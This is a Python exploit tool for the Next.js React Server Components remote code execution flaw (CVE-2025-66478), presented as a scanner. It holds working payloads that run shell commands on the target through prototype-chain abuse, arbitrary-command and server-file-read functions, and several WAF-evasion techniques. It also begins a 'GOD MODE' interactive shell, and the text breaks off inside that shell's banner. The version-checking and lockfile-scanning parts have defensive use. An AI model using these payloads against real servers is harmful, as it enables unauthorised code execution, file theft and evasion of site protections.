#!/usr/bin/env python3
"""
React2Shell Ultimate - CVE-2025-66478 Scanner
Next.js RSC (React Server Components) RCE Vulnerability Scanner

Combines best features from:
- Assetnote react2shell-scanner (HTTP-based detection, WAF bypass)
- Malayke scanner (version detection, patched version awareness)
- Pyroxenites tool (WAF bypass techniques)
- Abtonc run.sh (local project scanning)

Author: Satyam Rastogi (@hackersatyamrastogi)
Website: https://www.satyamrastogi.com
GitHub: https://github.com/hackersatyamrastogi

For authorized security testing only.
"""

import argparse
import sys
import json
import os
import re
import random
import string
import subprocess
import glob
import warnings
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from typing import Optional, Dict, List, Tuple
from pathlib import Path
from dataclasses import dataclass, asdict
from enum import Enum

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='.*OpenSSL.*')
warnings.filterwarnings('ignore', category=DeprecationWarning)

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("\n\033[91m[ERROR]\033[0m Missing dependency: 'requests'")
    print("\033[93m[FIX]\033[0m   Run: pip install requests\n")
    sys.exit(1)

# Optional tqdm for progress bar
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False


# ============================================================================
# CONSTANTS & CONFIGURATION
# ============================================================================

VERSION = "1.1.0"
TOOL_NAME = "React2Shell Ultimate CVE-2025-66478 Scanner"

# Patched versions (from scanner.go analysis)
PATCHED_VERSIONS = {
    15: {0: 5, 1: 9, 2: 6, 3: 6, 4: 8, 5: 7},  # 15.0.5, 15.1.9, etc.
    16: {0: 7},  # 16.0.7+
}

# CVE details
CVE_IDS = ["CVE-2025-55182", "CVE-2025-66478"]


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


class ScanMode(Enum):
    SAFE = "safe"           # Side-channel detection (no RCE)
    RCE_POC = "rce"         # RCE proof-of-concept (41*271=11111)
    VERSION_ONLY = "version"  # Version detection only (HTTP headers)
    LOCAL = "local"         # Local project scanning


@dataclass
class ScanResult:
    url: str
    vulnerable: Optional[bool] = None
    version: Optional[str] = None
    status_code: Optional[int] = None
    detection_method: Optional[str] = None
    waf_detected: bool = False
    waf_bypassed: bool = False
    error: Optional[str] = None
    timestamp: str = ""
    raw_response: Optional[str] = None

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat() + "Z"


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def colorize(text: str, color: str) -> str:
    """Apply color to text."""
    return f"{color}{text}{Colors.RESET}"


def print_banner(god_mode: bool = False):
    """Print the tool banner."""
    if god_mode:
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║     ____                 _   ___  ____  _          _ _                 ║
║    |  _ \\ ___  __ _  ___| |_|__ \\/ ___|| |__   ___| | |                ║
║    | |_) / _ \\/ _` |/ __| __| / /\\___ \\| '_ \\ / _ \\ | |                ║
║    |  _ <  __/ (_| | (__| |_ / /_ ___) | | | |  __/ | |                ║
║    |_| \\_\\___|\\__,_|\\___|\\__|____|____/|_| |_|\\___|_|_|                ║
║                                                                        ║
║            React2Shell Ultimate CVE-2025-66478 Scanner v{VERSION}         ║
║          Next.js RSC Remote Code Execution Vulnerability               ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}Author: Satyam Rastogi (@hackersatyamrastogi){Colors.RED}                        ║
║  {Colors.WHITE}https://github.com/hackersatyamrastogi{Colors.RED}                              ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.WHITE}███  GOD MODE ACTIVE - AUTHORIZED RED TEAM USE ONLY  ███{Colors.RED}             ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}⚠️  WARNING: This mode enables full command execution on targets.{Colors.RED}     ║
║  {Colors.YELLOW}⚠️  Only use on systems you have EXPLICIT WRITTEN AUTHORIZATION.{Colors.RED}     ║
║  {Colors.YELLOW}⚠️  Unauthorized access is a federal crime (CFAA, CMA, etc.){Colors.RED}         ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    else:
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║     ____                 _   ___  ____  _          _ _                 ║
║    |  _ \\ ___  __ _  ___| |_|__ \\/ ___|| |__   ___| | |                ║
║    | |_) / _ \\/ _` |/ __| __| / /\\___ \\| '_ \\ / _ \\ | |                ║
║    |  _ <  __/ (_| | (__| |_ / /_ ___) | | | |  __/ | |                ║
║    |_| \\_\\___|\\__,_|\\___|\\__|____|____/|_| |_|\\___|_|_|                ║
║                                                                        ║
║            React2Shell Ultimate CVE-2025-66478 Scanner v{VERSION}         ║
║          Next.js RSC Remote Code Execution Vulnerability               ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}Author: Satyam Rastogi (@hackersatyamrastogi){Colors.CYAN}                        ║
║  {Colors.WHITE}https://github.com/hackersatyamrastogi{Colors.CYAN}                              ║
╠════════════════════════════════════════════════════════════════════════╣
║  Modes: --safe (side-channel) | --rce (PoC) | --version | --local      ║
║  WAF Bypass: --waf-bypass | --vercel-bypass | --unicode                ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)


def normalize_url(url: str) -> str:
    """Normalize URL to include scheme."""
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    return url.rstrip("/")


def parse_version(version: str) -> Tuple[int, int, int, bool, int]:
    """
    Parse Next.js version string.
    Returns: (major, minor, patch, is_canary, canary_num)
    """
    version = version.lstrip("v").strip()
    is_canary = "canary" in version.lower()
    canary_num = 0

    # Match: 15.0.1 or 14.3.0-canary.77
    match = re.match(r'^(\d+)\.(\d+)\.(\d+)(?:-canary\.(\d+))?', version)
    if not match:
        return (0, 0, 0, False, 0)

    major = int(match.group(1))
    minor = int(match.group(2))
    patch = int(match.group(3))
    if match.group(4):
        canary_num = int(match.group(4))

    return (major, minor, patch, is_canary, canary_num)


def is_vulnerable(version: str) -> Tuple[bool, str]:
    """
    Check if a Next.js version is vulnerable to CVE-2025-66478.
    Returns: (is_vulnerable, reason)
    """
    major, minor, patch, is_canary, canary_num = parse_version(version)

    if major == 0:
        return (False, "Unable to parse version")

    # Next.js 16.x
    if major == 16:
        if minor == 0 and patch >= 7:
            return (False, f"Patched in 16.0.7+")
        if minor > 0:
            return (False, f"16.{minor}.x is patched")
        return (True, f"16.0.0-16.0.6 are vulnerable")

    # Next.js 15.x
    if major == 15:
        if minor in PATCHED_VERSIONS.get(15, {}):
            patched_patch = PATCHED_VERSIONS[15][minor]
            if patch >= patched_patch:
                return (False, f"Patched in 15.{minor}.{patched_patch}+")
        return (True, "15.x without patch is vulnerable")

    # Next.js 14.x canary
    if major == 14 and is_canary:
        if minor > 3:
            return (True, "14.x canary (minor > 3) is vulnerable")
        if minor == 3 and patch == 0 and canary_num >= 77:
            return (True, "14.3.0-canary.77+ is vulnerable")
        if minor == 3 and patch > 0:
            return (True, "14.3.x canary is vulnerable")
        return (False, "Pre-vulnerability canary version")

    # Other versions (13.x, 14.x stable, etc.)
    return (False, f"Version {major}.x is not affected")


# ============================================================================
# PAYLOAD BUILDERS
# ============================================================================

def generate_junk_data(size_kb: int = 128) -> Tuple[str, str]:
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk


def encode_unicode(data: str) -> str:
    """Encode string characters as Unicode escapes for WAF bypass."""
    result = []
    in_string = False
    i = 0
    while i < len(data):
        c = data[i]
        if c == '"':
            in_string = not in_string
            result.append(c)
        elif not in_string:
            result.append(c)
        elif c == '\\' and i + 1 < len(data):
            result.append(c)
            result.append(data[i + 1])
            i += 1
        else:
            result.append(f"\\u{ord(c):04x}")
        i += 1
    return ''.join(result)


def build_safe_payload() -> Tuple[str, str]:
    """
    Build safe side-channel detection payload.
    This triggers a specific error response without executing code.
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_payload(
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """
    Build RCE proof-of-concept payload.
    Executes: echo $((41*271)) = 11111 (or PowerShell equivalent)
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        cmd = 'powershell -c \\"41*271\\"'
    else:
        cmd = 'echo $((41*271))'

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })

    if unicode_encode:
        part0 = encode_unicode(part0)

    parts = []

    # Add junk data at start for WAF bypass
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.extend([
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ])

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_vercel_bypass_payload() -> Tuple[str, str]:
    """
    Build Vercel-specific WAF bypass payload.
    Uses special character escaping to evade Vercel's WAF.
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\\u0024\\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_exploit_payload(
    command: str,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """
    Build custom command execution payload for authorized red team assessments.
    Returns command output in X-Action-Redirect header or response body.
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    # Escape single quotes in command
    escaped_cmd = command.replace("'", "\\'")

    if windows:
        # PowerShell execution
        prefix_payload = (
            f"var res=process.mainModule.require('child_process')"
            f".execSync('powershell -c \"{escaped_cmd}\"',{{timeout:30000}})"
            f".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/exploit?out=${{encodeURIComponent(res)}};307;`}});"
        )
    else:
        # Unix/Linux execution
        prefix_payload = (
            f"var res=process.mainModule.require('child_process')"
            f".execSync('{escaped_cmd}',{{timeout:30000}})"
            f".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/exploit?out=${{encodeURIComponent(res)}};307;`}});"
        )

    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })

    if unicode_encode:
        part0 = encode_unicode(part0)

    parts = []

    # Add junk data at start for WAF bypass
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.extend([
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ])

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_file_read_payload(
    filepath: str,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """
    Build file read payload for authorized red team assessments.
    Reads file contents and returns in response.
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    escaped_path = filepath.replace("'", "\\'")

    prefix_payload = (
        f"var res=process.mainModule.require('fs')"
        f".readFileSync('{escaped_path}','utf-8');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/exploit?out=${{encodeURIComponent(res)}};307;`}});"
    )

    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })

    if unicode_encode:
        part0 = encode_unicode(part0)

    parts = []

    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.extend([
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ])

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


# ============================================================================
# SCANNERS
# ============================================================================

class NextJSScanner:
    """Main scanner class for CVE-2025-66478 detection."""

    def __init__(
        self,
        timeout: int = 10,
        verify_ssl: bool = False,
        user_agent: str = None,
        proxy: str = None
    ):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.user_agent = user_agent or (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        self.session = requests.Session()
        self.session.verify = verify_ssl

        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }

    def _get_headers(self, content_type: str = None) -> Dict[str, str]:
        """Build request headers."""
        headers = {
            "User-Agent": self.user_agent,
            "Next-Action": "x",
            "X-Nextjs-Request-Id": f"scan-{random.randint(1000, 9999)}",
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        }
        if content_type:
            headers["Content-Type"] = content_type
        return headers

    def detect_version_http(self, url: str) -> ScanResult:
        """
        Detect Next.js version using HTTP headers and response analysis.
        Fast method that doesn't require browser.
        """
        result = ScanResult(url=url, detection_method="http_headers")
        url = normalize_url(url)

        if not url:
            result.error = "Invalid URL"
            return result

        try:
            # First, check regular response headers
            resp = self.session.get(
                url,
                headers={"User-Agent": self.user_agent},
                timeout=self.timeout,
                allow_redirects=True
            )
            result.status_code = resp.status_code

            # Check X-Powered-By header
            x_powered_by = resp.headers.get("X-Powered-By", "")
            if "Next.js" in x_powered_by:
                match = re.search(r'Next\.js\s+([0-9.]+(?:-canary\.\d+)?)', x_powered_by)
                if match:
                    result.version = match.group(1)

            # Check Vary header for RSC indicators
            vary = resp.headers.get("Vary", "")
            has_rsc = any(x in vary for x in ["RSC", "Next-Router-State-Tree"])

            # Check for RSC response
            rsc_resp = self.session.get(
                url,
                headers={"User-Agent": self.user_agent, "RSC": "1"},
                timeout=self.timeout,
                allow_redirects=True
            )

            is_rsc = rsc_resp.headers.get("Content-Type", "").startswith("text/x-component")

            # Try to extract version from page source
            if not result.version:
                # Check for buildId or version in response
                build_match = re.search(r'"buildId"\s*:\s*"([^"]+)"', resp.text)
                if build_match:
                    result.detection_method = "build_id"

                # Check for /_next/ static paths (confirms Next.js)
                if "/_next/" in resp.text or "__next" in resp.text:
                    if not result.version:
                        result.version = "detected (version unknown)"

            # Determine vulnerability
            if result.version and result.version != "detected (version unknown)":
                vuln, reason = is_vulnerable(result.version)
                result.vulnerable = vuln
            elif has_rsc or is_rsc:
                # RSC detected but version unknown - potentially vulnerable
                result.version = result.version or "RSC detected (version unknown)"
                result.vulnerable = None  # Unknown

            return result

        except RequestException as e:
            result.error = str(e)
            return result

    def scan_safe(self, url: str) -> ScanResult:
        """
        Safe side-channel vulnerability detection.
        Triggers error response without executing code.
        """
        result = ScanResult(url=url, detection_method="safe_side_channel")
        url = normalize_url(url)

        if not url:
            result.error = "Invalid URL"
            return result

        body, content_type = build_safe_payload()
        headers = self._get_headers(content_type)

        try:
            resp = self.session.post(
                f"{url}/",
                headers=headers,
                data=body.encode('utf-8'),
                timeout=self.timeout,
                allow_redirects=False
            )
            result.status_code = resp.status_code
            result.raw_response = resp.text[:2000]

            # Check for vulnerability indicators
            if resp.status_code == 500 and 'E{"digest"' in resp.text:
                # Check for WAF/mitigation
                server = resp.headers.get("Server", "").lower()
                has_netlify = "Netlify-Vary" in resp.headers

                if server in ["vercel", "netlify"] or has_netlify:
                    result.vulnerable = False
                    result.waf_detected = True
                else:
                    result.vulnerable = True
            elif resp.status_code == 403:
                result.waf_detected = True
                result.vulnerable = None  # Blocked, unknown
            else:
                result.vulnerable = False

            return result

        except RequestException as e:
            result.error = str(e)
            return result

    def scan_rce(
        self,
        url: str,
        windows: bool = False,
        waf_bypass: bool = False,
        waf_bypass_size_kb: int = 128,
        unicode_encode: bool = False,
        vercel_bypass: bool = False
    ) -> ScanResult:
        """
        RCE proof-of-concept scan.
        Executes harmless calculation (41*271=11111) to verify RCE.
        """
        result = ScanResult(url=url, detection_method="rce_poc")
        url = normalize_url(url)

        if not url:
            result.error = "Invalid URL"
            return result

        # Build payload based on options
        if vercel_bypass:
            body, content_type = build_vercel_bypass_payload()
            result.detection_method = "rce_poc_vercel_bypass"
        else:
            body, content_type = build_rce_payload(
                windows=windows,
                waf_bypass=waf_bypass,
                waf_bypass_size_kb=waf_bypass_size_kb,
                unicode_encode=unicode_encode
            )
            if waf_bypass:
                result.detection_method = "rce_poc_waf_bypass"
            if unicode_encode:
                result.detection_method = "rce_poc_unicode"

        headers = self._get_headers(content_type)

        try:
            resp = self.session.post(
                f"{url}/",
                headers=headers,
                data=body.encode('utf-8'),
                timeout=self.timeout + (10 if waf_bypass else 0),
                allow_redirects=False
            )
            result.status_code = resp.status_code
            result.raw_response = resp.text[:2000]

            # Check for RCE success (41*271 = 11111)
            redirect_header = resp.headers.get("X-Action-Redirect", "")

            if re.search(r'.*/login\?a=11111.*', redirect_header):
                result.vulnerable = True
                if waf_bypass or unicode_encode or vercel_bypass:
                    result.waf_bypassed = True
            elif resp.status_code == 403:
                result.waf_detected = True
                result.vulnerable = None  # Blocked
            else:
                result.vulnerable = False

            return result

        except RequestException as e:
            result.error = str(e)
            return result

    def scan_comprehensive(
        self,
        url: str,
        windows: bool = False,
        try_bypasses: bool = True
    ) -> ScanResult:
        """
        Comprehensive scan: version detection + safe check + RCE PoC with bypasses.
        """
        url = normalize_url(url)

        # Step 1: Version detection
        version_result = self.detect_version_http(url)

        # Step 2: Safe check
        safe_result = self.scan_safe(url)

        # If safe check shows vulnerable, we're done
        if safe_result.vulnerable:
            safe_result.version = version_result.version
            safe_result.detection_method = "safe_side_channel"
            return safe_result

        # Step 3: If WAF detected and bypasses enabled, try RCE with bypasses
        if safe_result.waf_detected and try_bypasses:
            # Try standard RCE
            rce_result = self.scan_rce(url, windows=windows)
            if rce_result.vulnerable:
                rce_result.version = version_result.version
                return rce_result

            # Try junk data bypass
            rce_result = self.scan_rce(url, windows=windows, waf_bypass=True)
            if rce_result.vulnerable:
                rce_result.version = version_result.version
                return rce_result

            # Try unicode bypass
            rce_result = self.scan_rce(url, windows=windows, unicode_encode=True)
            if rce_result.vulnerable:
                rce_result.version = version_result.version
                return rce_result

            # Try Vercel-specific bypass
            rce_result = self.scan_rce(url, vercel_bypass=True)
            if rce_result.vulnerable:
                rce_result.version = version_result.version
                return rce_result

        # Return best result
        if version_result.version:
            version_result.waf_detected = safe_result.waf_detected
            vuln, _ = is_vulnerable(version_result.version) if version_result.version else (None, "")
            if vuln is not None:
                version_result.vulnerable = vuln and not safe_result.waf_detected
            return version_result

        return safe_result

    def exploit_execute(
        self,
        url: str,
        command: str,
        windows: bool = False,
        waf_bypass: bool = False,
        waf_bypass_size_kb: int = 128,
        unicode_encode: bool = False
    ) -> Tuple[bool, str]:
        """
        Execute custom command on vulnerable target.
        For authorized red team assessments only.
        Returns: (success, output_or_error)
        """
        url = normalize_url(url)
        if not url:
            return False, "Invalid URL"

        body, content_type = build_exploit_payload(
            command=command,
            windows=windows,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
            unicode_encode=unicode_encode
        )
        headers = self._get_headers(content_type)

        try:
            resp = self.session.post(
                f"{url}/",
                headers=headers,
                data=body.encode('utf-8'),
                timeout=self.timeout + 20,  # Extra time for command execution
                allow_redirects=False
            )

            # Extract output from X-Action-Redirect header
            redirect_header = resp.headers.get("X-Action-Redirect", "")

            # Parse output from redirect URL
            match = re.search(r'[?&]out=([^&;]+)', redirect_header)
            if match:
                from urllib.parse import unquote
                output = unquote(match.group(1))
                return True, output

            # Try to extract from response body if not in header
            body_match = re.search(r'out=([^&;\s"]+)', resp.text)
            if body_match:
                from urllib.parse import unquote
                output = unquote(body_match.group(1))
                return True, output

            if resp.status_code == 403:
                return False, "WAF blocked the request (403 Forbidden)"
            elif resp.status_code == 500:
                return False, "Server error - command may have failed or syntax error"
            else:
                return False, f"No output captured (Status: {resp.status_code})"

        except RequestException as e:
            return False, f"Request failed: {str(e)}"

    def exploit_read_file(
        self,
        url: str,
        filepath: str,
        waf_bypass: bool = False,
        waf_bypass_size_kb: int = 128,
        unicode_encode: bool = False
    ) -> Tuple[bool, str]:
        """
        Read file from vulnerable target.
        For authorized red team assessments only.
        Returns: (success, content_or_error)
        """
        url = normalize_url(url)
        if not url:
            return False, "Invalid URL"

        body, content_type = build_file_read_payload(
            filepath=filepath,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
            unicode_encode=unicode_encode
        )
        headers = self._get_headers(content_type)

        try:
            resp = self.session.post(
                f"{url}/",
                headers=headers,
                data=body.encode('utf-8'),
                timeout=self.timeout + 10,
                allow_redirects=False
            )

            # Extract output from X-Action-Redirect header
            redirect_header = resp.headers.get("X-Action-Redirect", "")

            match = re.search(r'[?&]out=([^&;]+)', redirect_header)
            if match:
                from urllib.parse import unquote
                content = unquote(match.group(1))
                return True, content

            body_match = re.search(r'out=([^&;\s"]+)', resp.text)
            if body_match:
                from urllib.parse import unquote
                content = unquote(body_match.group(1))
                return True, content

            if resp.status_code == 403:
                return False, "WAF blocked the request"
            else:
                return False, f"File read failed (Status: {resp.status_code})"

        except RequestException as e:
            return False, f"Request failed: {str(e)}"


def scan_local_project(path: str = ".") -> List[ScanResult]:
    """
    Scan local Next.js project for vulnerable versions.
    Checks package.json, package-lock.json, yarn.lock, pnpm-lock.yaml.
    """
    results = []
    path = Path(path)

    # Files to check
    lockfiles = [
        "package.json",
        "package-lock.json",
        "yarn.lock",
        "pnpm-lock.yaml",
        "bun.lockb"
    ]

    for lockfile in lockfiles:
        for filepath in path.rglob(lockfile):
            # Skip node_modules
            if "node_modules" in str(filepath):
                continue

            version = None

            try:
                content = filepath.read_text(errors='ignore')

                if lockfile == "package.json":
                    match = re.search(r'"next"\s*:\s*"([^"]+)"', content)
                    if match:
                        version = match.group(1).lstrip("^~")

                elif lockfile == "package-lock.json":
                    # Look for "next" package version
                    match = re.search(r'"next"[^}]*"version"\s*:\s*"([^"]+)"', content)
                    if match:
                        version = match.group(1)

                elif lockfile == "yarn.lock":
                    # yarn.lock format: next@version:
                    match = re.search(r'next@[^:]+:\s*\n\s*version\s+"([^"]+)"', content)
                    if match:
                        version = match.group(1)

                elif lockfile == "pnpm-lock.yaml":
                    match = re.search(r'next@([0-9.]+(?:-canary\.\d+)?)', content)
                    if match:
                        version = match.group(1)

                if version:
                    result = ScanResult(
                        url=str(filepath),
                        version=version,
                        detection_method="local_lockfile"
                    )
                    vuln, reason = is_vulnerable(version)
                    result.vulnerable = vuln
                    results.append(result)

            except Exception as e:
                results.append(ScanResult(
                    url=str(filepath),
                    error=str(e),
                    detection_method="local_lockfile"
                ))

    return results


# ============================================================================
# OUTPUT FORMATTERS
# ============================================================================

def print_result(result: ScanResult, verbose: bool = False):
    """Print a single scan result."""
    if result.vulnerable is True:
        status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
    elif result.vulnerable is False:
        status = colorize("[NOT VULNERABLE]", Colors.GREEN)
    elif result.waf_detected:
        status = colorize("[WAF BLOCKED]", Colors.YELLOW)
    elif result.error:
        status = colorize("[ERROR]", Colors.YELLOW)
    else:
        status = colorize("[UNKNOWN]", Colors.BLUE)

    version_str = result.version or "N/A"
    status_code_str = str(result.status_code) if result.status_code else "-"

    print(f"{status} {result.url}")
    print(f"    Version: {version_str} | Status: {status_code_str} | Method: {result.detection_method}")

    if result.waf_bypassed:
        print(colorize("    WAF Bypass: SUCCESS", Colors.MAGENTA))
    elif result.waf_detected:
        print(colorize("    WAF Detected: Exploit blocked", Colors.YELLOW))

    if result.error:
        print(colorize(f"    Error: {result.error}", Colors.YELLOW))

    if verbose and result.raw_response:
        print(colorize("    Response snippet:", Colors.CYAN))
        for line in result.raw_response.split('\n')[:5]:
            print(f"      {line[:100]}")

    print()


def save_results(results: List[ScanResult], output_file: str, vulnerable_only: bool = True):
    """Save results to JSON file."""
    if vulnerable_only:
        results = [r for r in results if r.vulnerable is True]

    output = {
        "tool": TOOL_NAME,
        "version": VERSION,
        "cve_ids": CVE_IDS,
        "scan_time": datetime.now(timezone.utc).isoformat() + "Z",
        "total_results": len(results),
        "results": [asdict(r) for r in results]
    }

    try:
        with open(output_file, "w") as f:
            json.dump(output, f, indent=2)
        print(colorize(f"\n[+] Results saved to: {output_file}", Colors.GREEN))
    except Exception as e:
        print(colorize(f"\n[ERROR] Failed to save results: {e}", Colors.RED))


# ============================================================================
# GOD MODE - INTERACTIVE SHELL
# ============================================================================

def run_interactive_shell(
    scanner: NextJSScanner,
    url: str,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
):
    """
    Run interactive shell on vulnerable target.
    For authorized red team assessments only.
    """
    print(f"""
{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║                    INTERACTIVE SHELL - GOD MODE                        ║
╠════════════════════════════════════════════════════════════════════════╣
║  Target: {url[:60]:<60}  ║
╠════════════════════════════════════════════════════════════════════════╣
